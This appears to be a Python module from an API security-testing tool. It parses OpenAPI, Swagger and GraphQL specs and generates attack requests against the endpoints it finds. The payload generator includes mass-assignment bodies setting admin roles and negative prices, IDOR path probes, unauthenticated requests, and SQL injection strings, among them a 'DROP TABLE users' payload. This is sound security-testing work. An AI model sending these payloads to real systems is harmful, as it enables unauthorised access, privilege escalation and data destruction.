"""Spec Ingestion — Parse API specifications to generate semantic attack surfaces.

Ingests OpenAPI (Swagger), GraphQL schemas, and gRPC reflection data
to generate targeted, semantically-aware attack payloads. This is what
upgrades Titan from pattern-matching to understanding.

Usage:
    from titan.core.spec_ingest import SpecIngestor

    ingestor = SpecIngestor()
    surface = await ingestor.ingest("https://api.target.com/openapi.json")
    payloads = ingestor.generate_semantic_payloads(surface)
"""

from __future__ import annotations

import json
import logging
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Optional

from titan.transport.base import AttackRequest, RequestMethod

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Data types
# ---------------------------------------------------------------------------

class ParamLocation(Enum):
    QUERY = "query"
    HEADER = "header"
    PATH = "path"
    BODY = "body"
    COOKIE = "cookie"


class AuthType(Enum):
    NONE = "none"
    API_KEY = "api_key"
    BEARER = "bearer"
    OAUTH2 = "oauth2"
    BASIC = "basic"
    COOKIE = "cookie"


@dataclass
class ApiEndpoint:
    """A discovered API endpoint."""
    method: str
    path: str
    summary: str = ""
    description: str = ""
    parameters: list[dict] = field(default_factory=list)
    request_body: dict | None = None
    responses: dict = field(default_factory=dict)
    auth_required: bool = False
    auth_type: AuthType = AuthType.NONE
    tags: list[str] = field(default_factory=list)
    deprecated: bool = False


@dataclass
class ApiSchema:
    """A data model/schema from the API spec."""
    name: str
    properties: dict[str, dict] = field(default_factory=dict)
    required: list[str] = field(default_factory=list)
    example: dict | None = None


@dataclass
class AttackSurface:
    """Complete attack surface from an API specification."""
    title: str = ""
    version: str = ""
    base_url: str = ""
    endpoints: list[ApiEndpoint] = field(default_factory=list)
    schemas: list[ApiSchema] = field(default_factory=list)
    auth_type: AuthType = AuthType.NONE
    auth_flows: list[dict] = field(default_factory=list)
    discovery_source: str = ""


# ---------------------------------------------------------------------------
# Spec Ingestor
# ---------------------------------------------------------------------------

class SpecIngestor:
    """Parse API specifications and generate semantic attack surfaces.

    Supports:
      - OpenAPI 2.0 (Swagger) and 3.x
      - GraphQL introspection
      - gRPC server reflection
    """

    async def ingest(self, spec_url: str) -> AttackSurface:
        """Ingest an API spec from a URL.

        Auto-detects the spec format (OpenAPI, GraphQL, gRPC).
        """
        # Try to fetch the spec
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.get(spec_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    if resp.status != 200:
                        logger.warning(f"Spec fetch failed: {resp.status}")
                        return AttackSurface(discovery_source=spec_url)
                    content_type = resp.headers.get("content-type", "")
                    body = await resp.text()
        except Exception as e:
            logger.warning(f"Could not fetch spec: {e}")
            return AttackSurface(discovery_source=spec_url)

        # Auto-detect format
        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            # Not JSON — might be GraphQL schema
            if "type " in body or "schema " in body:
                return self._parse_graphql(body, spec_url)
            return AttackSurface(discovery_source=spec_url)

        # OpenAPI 3.x
        if "openapi" in data and data["openapi"].startswith("3"):
            return self._parse_openapi3(data, spec_url)

        # OpenAPI 2.0 (Swagger)
        if "swagger" in data and data["swagger"].startswith("2"):
            return self._parse_openapi2(data, spec_url)

        # Unknown format
        return AttackSurface(discovery_source=spec_url)

    def _parse_openapi3(self, data: dict, source: str) -> AttackSurface:
        """Parse OpenAPI 3.x spec."""
        info = data.get("info", {})
        servers = data.get("servers", [])
        base_url = servers[0].get("url", "") if servers else ""

        surface = AttackSurface(
            title=info.get("title", ""),
            version=info.get("version", ""),
            base_url=base_url,
            discovery_source=source,
        )

        # Parse security schemes
        components = data.get("components", {})
        security_schemes = components.get("securitySchemes", {})
        for name, scheme in security_schemes.items():
            surface.auth_flows.append({
                "name": name,
                "type": scheme.get("type", ""),
                "scheme": scheme.get("scheme", ""),
                "bearerFormat": scheme.get("bearerFormat", ""),
            })
            if scheme.get("type") == "http":
                surface.auth_type = AuthType.BEARER if scheme.get("scheme") == "bearer" else AuthType.BASIC
            elif scheme.get("type") == "apiKey":
                surface.auth_type = AuthType.API_KEY

        # Parse schemas
        for name, schema in components.get("schemas", {}).items():
            surface.schemas.append(ApiSchema(
                name=name,
                properties=schema.get("properties", {}),
                required=schema.get("required", []),
            ))

        # Parse endpoints
        for path, path_item in data.get("paths", {}).items():
            for method in ["get", "post", "put", "delete", "patch"]:
                operation = path_item.get(method)
                if not operation:
                    continue

                endpoint = ApiEndpoint(
                    method=method.upper(),
                    path=path,
                    summary=operation.get("summary", ""),
                    description=operation.get("description", ""),
                    parameters=path_item.get("parameters", []) + operation.get("parameters", []),
                    request_body=operation.get("requestBody"),
                    responses=operation.get("responses", {}),
                    auth_required=bool(operation.get("security")),
                    tags=operation.get("tags", []),
                    deprecated=operation.get("deprecated", False),
                )
                surface.endpoints.append(endpoint)

        logger.info(f"OpenAPI 3.x ingested: {len(surface.endpoints)} endpoints, {len(surface.schemas)} schemas")
        return surface

    def _parse_openapi2(self, data: dict, source: str) -> AttackSurface:
        """Parse Swagger 2.0 spec."""
        info = data.get("info", {})
        host = data.get("host", "")
        base_path = data.get("basePath", "")
        schemes = data.get("schemes", ["https"])
        base_url = f"{schemes[0]}://{host}{base_path}" if host else ""

        surface = AttackSurface(
            title=info.get("title", ""),
            version=info.get("version", ""),
            base_url=base_url,
            discovery_source=source,
        )

        # Parse definitions (schemas)
        for name, definition in data.get("definitions", {}).items():
            surface.schemas.append(ApiSchema(
                name=name,
                properties=definition.get("properties", {}),
                required=definition.get("required", []),
            ))

        # Parse endpoints
        for path, path_item in data.get("paths", {}).items():
            for method in ["get", "post", "put", "delete", "patch"]:
                operation = path_item.get(method)
                if not operation:
                    continue

                endpoint = ApiEndpoint(
                    method=method.upper(),
                    path=path,
                    summary=operation.get("summary", ""),
                    description=operation.get("description", ""),
                    parameters=path_item.get("parameters", []) + operation.get("parameters", []),
                    request_body=operation.get("bodyParameters"),
                    responses=operation.get("responses", {}),
                    auth_required=bool(operation.get("security")),
                    tags=operation.get("tags", []),
                )
                surface.endpoints.append(endpoint)

        logger.info(f"Swagger 2.0 ingested: {len(surface.endpoints)} endpoints")
        return surface

    def _parse_graphql(self, schema_text: str, source: str) -> AttackSurface:
        """Parse a GraphQL schema (SDL format)."""
        surface = AttackSurface(discovery_source=source)

        # Extract types
        type_pattern = re.compile(r"type\s+(\w+)\s*\{([^}]+)\}", re.MULTILINE)
        for match in type_pattern.finditer(schema_text):
            type_name = match.group(1)
            fields_text = match.group(2)

            properties = {}
            for field_line in fields_text.strip().split("\n"):
                field_match = re.match(r"\s*(\w+)\s*(?:\([^)]*\))?\s*:\s*(.+)", field_line.strip())
                if field_match:
                    field_name = field_match.group(1)
                    field_type = field_match.group(2).strip()
                    properties[field_name] = {"type": field_type}

            surface.schemas.append(ApiSchema(
                name=type_name,
                properties=properties,
            ))

            # Query/Mutation types become endpoints
            if type_name in ("Query", "Mutation"):
                for field_name in properties:
                    method = "GET" if type_name == "Query" else "POST"
                    surface.endpoints.append(ApiEndpoint(
                        method=method,
                        path=f"/graphql#{field_name}",
                        summary=f"GraphQL {type_name}.{field_name}",
                        auth_required=False,
                    ))

        logger.info(f"GraphQL ingested: {len(surface.endpoints)} operations, {len(surface.schemas)} types")
        return surface

    def generate_semantic_payloads(self, surface: AttackSurface) -> list[AttackRequest]:
        """Generate targeted attacks from the API spec.

        Instead of generic payloads, these are semantically aware:
          - Mass assignment on actual DTO fields
          - IDOR using real entity IDs from schemas
          - Auth bypass on real role-gated endpoints
          - Contract violations with wrong types
          - Business logic attacks on real parameters
        """
        payloads = []

        for endpoint in surface.endpoints:
            base_url = surface.base_url.rstrip("/")

            # 1. Mass Assignment — add extra fields to POST/PUT bodies
            if endpoint.method in ("POST", "PUT", "PATCH"):
                for schema in surface.schemas:
                    if schema.name.lower() in endpoint.path.lower():
                        extra_fields = {}
                        for prop_name in ["admin", "role", "is_admin", "isAdmin",
                                          "user_id", "userId", "account_type",
                                          "price", "amount", "discount",
                                          "verified", "confirmed", "approved"]:
                            extra_fields[prop_name] = self._generate_value(prop_name)

                        payloads.append(AttackRequest(
                            url=f"{base_url}{endpoint.path}",
                            method=RequestMethod(endpoint.method),
                            headers={"Content-Type": "application/json"},
                            body=json.dumps(extra_fields),
                            metadata={"attack_type": "mass_assignment", "endpoint": endpoint.path},
                        ))

            # 2. IDOR — try accessing other users' resources
            if endpoint.method == "GET" and any(p in endpoint.path for p in ["/{id}", "/:id", "/{userId}"]):
                for test_id in ["1", "0", "999", "admin", "../admin"]:
                    test_path = re.sub(r"\{[^}]+\}|:\w+", test_id, endpoint.path)
                    payloads.append(AttackRequest(
                        url=f"{base_url}{test_path}",
                        method=RequestMethod.GET,
                        metadata={"attack_type": "idor", "endpoint": endpoint.path},
                    ))

            # 3. Auth bypass — hit authenticated endpoints without credentials
            if endpoint.auth_required:
                payloads.append(AttackRequest(
                    url=f"{base_url}{endpoint.path}",
                    method=RequestMethod(endpoint.method),
                    headers={"Content-Type": "application/json"},
                    body="{}",
                    metadata={"attack_type": "auth_bypass", "endpoint": endpoint.path},
                ))

            # 4. Contract violations — send wrong types
            if endpoint.method in ("POST", "PUT"):
                wrong_type_payloads = {
                    "string_field": 999999,
                    "number_field": "'; DROP TABLE users; --",
                    "array_field": "not_an_array",
                    "object_field": [1, 2, 3],
                    "boolean_field": "not_a_boolean",
                }
                payloads.append(AttackRequest(
                    url=f"{base_url}{endpoint.path}",
                    method=RequestMethod(endpoint.method),
                    headers={"Content-Type": "application/json"},
                    body=json.dumps(wrong_type_payloads),
                    metadata={"attack_type": "contract_violation", "endpoint": endpoint.path},
                ))

            # 5. SQLi on query parameters
            for param in endpoint.parameters:
                if param.get("in") == "query":
                    sqli_payloads = [
                        "' OR '1'='1",
                        "1; DROP TABLE users --",
                        "' UNION SELECT NULL,NULL,NULL--",
                    ]
                    for payload in sqli_payloads:
                        payloads.append(AttackRequest(
                            url=f"{base_url}{endpoint.path}",
                            method=RequestMethod(endpoint.method),
                            params={param["name"]: payload},
                            metadata={"attack_type": "sqli", "param": param["name"]},
                        ))

        logger.info(f"Generated {len(payloads)} semantic payloads from {len(surface.endpoints)} endpoints")
        return payloads

    def _generate_value(self, field_name: str) -> Any:
        """Generate a test value for a field based on its name."""
        name_lower = field_name.lower()
        if "admin" in name_lower or "role" in name_lower:
            return "admin"
        if "price" in name_lower or "amount" in name_lower or "discount" in name_lower:
            return -1
        if "user" in name_lower and "id" in name_lower:
            return 1
        if "verified" in name_lower or "confirmed" in name_lower:
            return True
        return "test_value"
